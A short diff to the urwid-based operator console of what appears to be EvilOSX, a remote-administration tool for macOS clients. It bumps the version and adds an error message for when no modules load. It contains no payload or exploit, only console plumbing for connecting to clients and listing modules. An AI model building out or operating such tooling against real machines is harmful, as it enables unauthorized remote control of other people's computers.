@@ -3,7 +3,7 @@
 """Interacts with the user via urwid."""
 __author__ = "Marten4n6"
 __license__ = "GPLv3"
-__version__ = "1.1.0"
+__version__ = "1.1.1"
 
 from model import *
 from modules import *
@@ -298,11 +298,21 @@ class View(urwid.Frame):
                 self.output_view.add("Invalid client ID (see \"clients\").", "attention")
                 self.output_view.add("Usage: connect <ID>", "attention")
         elif command == "modules":
-            for module_name, module_imp in self._modules.get_modules().iteritems():
-                if module_name == "helpers":
-                    continue
+            modules = self._modules.get_modules()
 
-                self.output_view.add("{0: <18} -   {1}".format(module_name, module_imp.info["Description"]))
+            if not modules:
+                self.output_view.add(
+                    "Failed to find modules, please restart and make sure you are running "
+                    "the start command in the correct directory (in EvilOSX/).",
+                    "attention"
+                )
+                self.output_view.add("Server start command: python server/server.py", "attention")
+            else:
+                for module_name, module_imp in modules.iteritems():
+                    if module_name == "helpers":
+                        continue
+
+                    self.output_view.add("{0: <18} -   {1}".format(module_name, module_imp.info["Description"]))
         elif command == "clear":
             self.output_view.clear()
         elif command in ["q", "quit", "exit"] and not self._current_client:
